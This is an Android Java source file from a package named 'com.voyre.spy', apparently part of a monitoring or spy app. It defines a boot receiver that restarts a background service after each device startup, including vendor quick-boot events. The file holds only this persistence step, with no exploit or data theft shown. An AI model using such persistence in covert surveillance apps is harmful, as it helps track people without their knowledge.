package com.voyre.spy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null) {
            String action = intent.getAction();
            if (action.equals(Intent.ACTION_BOOT_COMPLETED) || 
                action.equals("android.intent.action.QUICKBOOT_POWERON") ||
                action.equals("com.htc.intent.action.QUICKBOOT_POWERON")) {
                context.startService(new Intent(context, BackgroundService.class));
            }
        }
    }
}